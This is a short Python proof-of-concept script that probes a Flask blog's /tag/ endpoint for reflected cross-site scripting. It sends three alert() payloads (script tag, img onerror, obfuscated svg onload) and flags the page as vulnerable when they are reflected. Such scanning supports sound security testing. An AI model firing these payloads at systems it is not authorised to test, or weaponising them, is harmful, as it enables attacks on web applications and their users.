#!/usr/bin/env python3
"""XSS POC for Flask Blog - /tag/<tag_name> endpoint"""

import requests
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<sVg ONloAd=alert("zast-xss")>',
]

print(f"Target: {target}/tag/<payload>\n")

for payload in payloads:
    url = f"{target}/tag/{payload}"
    r = requests.get(url)

    if payload in r.text:
        print(f"[VULNERABLE] {payload}")
    else:
        print(f"[SAFE] {payload}")